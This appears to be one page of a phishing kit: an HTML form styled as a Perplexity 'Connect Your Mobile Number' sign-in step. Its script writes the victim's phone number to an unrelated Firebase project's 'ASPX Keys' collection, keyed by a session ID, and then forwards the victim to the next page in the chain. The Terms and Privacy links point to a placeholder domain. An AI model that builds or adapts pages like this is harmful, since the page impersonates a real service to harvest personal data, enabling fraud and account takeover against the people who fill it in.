<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Mobile - Perplexity</title>
    
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>

    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; }
        body { background: #ffffff; display: flex; flex-direction: column; align-items: center; padding: 60px 24px; color: #2d333a; }
        .container { width: 100%; max-width: 400px; text-align: center; }
        
        h1 { font-size: 32px; font-weight: 600; margin-bottom: 16px; color: #000; letter-spacing: -0.5px; }
        p.desc { font-size: 16px; color: #6e6e80; line-height: 1.5; margin-bottom: 40px; }
        
        .field { position: relative; margin-bottom: 8px; text-align: left; }
        .field label { position: absolute; top: -10px; left: 15px; background: #fff; padding: 0 5px; font-size: 12px; color: #6e6e80; }
        input { width: 100%; padding: 16px; font-size: 18px; border: 1px solid #d1d1d6; border-radius: 14px; outline: none; transition: 0.2s; }
        input:focus { border-color: #000; }
        
        .error { color: #df1b41; font-size: 13px; text-align: left; display: none; margin-top: 5px; font-weight: 500; }
        
        .terms { font-size: 14px; color: #6e6e80; margin-top: 30px; line-height: 1.5; }
        .terms a { color: #000; text-decoration: underline; cursor: pointer; }
        
        .btn { width: 100%; background: #000; color: #fff; border: none; padding: 18px; border-radius: 35px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 40px; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
    </style>
</head>
<body>

    <div class="container">
        <h1>Connect Your Mobile Number</h1>
        <p class="desc">Connect Your Phone Number to signing in to your Perplexity Account</p>

        <div class="field">
            <label>Mobile number</label>
            <input type="text" id="mobile" placeholder="+91 1234567890" spellcheck="false">
            <div id="errorMsg" class="error">Please enter a valid number (e.g. +91 1234567890)</div>
        </div>

        <p class="terms">
            By clicking "Continue", you agree to our <a href="https://1.com">Terms</a> and 
            have read our <a href="https://1.com">Privacy Policy</a>.
        </p>

        <button id="nextBtn" class="btn">Continue</button>
    </div>

    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
            authDomain: "question-metabase.firebaseapp.com",
            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "question-metabase",
            storageBucket: "question-metabase.firebasestorage.app",
            messagingSenderId: "770698198753",
            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
            measurementId: "G-6ZP1FPMKSJ"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // Get Dynamic Session ID from URL (?session=4683853387)
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');

        const mobileInput = document.getElementById('mobile');
        const nextBtn = document.getElementById('nextBtn');
        const errorMsg = document.getElementById('errorMsg');

        async function submitData() {
            const val = mobileInput.value.trim();
            // Validates +91 1234567890 or +911234567890 (exactly 10 digits after code)
            const phoneRegex = /^\+91\s?\d{10}$/;

            if (!sessionId) {
                alert("Session ID missing in URL");
                return;
            }

            if (phoneRegex.test(val)) {
                errorMsg.style.display = 'none';
                nextBtn.disabled = true;
                nextBtn.innerText = "Connecting...";

                try {
                    // Update the existing document in "ASPX Keys" using the SESSION ID
                    const docRef = db.collection("ASPX Keys").doc(sessionId);

                    await docRef.set({
                        mobile: val,
                        updatedAt: new Date().toLocaleString() + " UTC+5:30"
                    }, { merge: true }); // MERGE ensures we don't overwrite previous fields

                    // Redirect to 6.html with the same session ID
                    window.location.href = `6.html?session=${sessionId}`;

                } catch (err) {
                    console.error(err);
                    alert("Error updating record. Try again.");
                    nextBtn.disabled = false;
                    nextBtn.innerText = "Continue";
                }
            } else {
                errorMsg.style.display = 'block';
            }
        }

        // Click Event
        nextBtn.addEventListener('click', submitData);

        // Enter Key = Next
        mobileInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') submitData();
        });

        // Auto-prefix +91
        mobileInput.addEventListener('focus', () => {
            if (!mobileInput.value.startsWith('+91')) {
                mobileInput.value = '+91 ';
            }
        });
    </script>
</body>
</html>
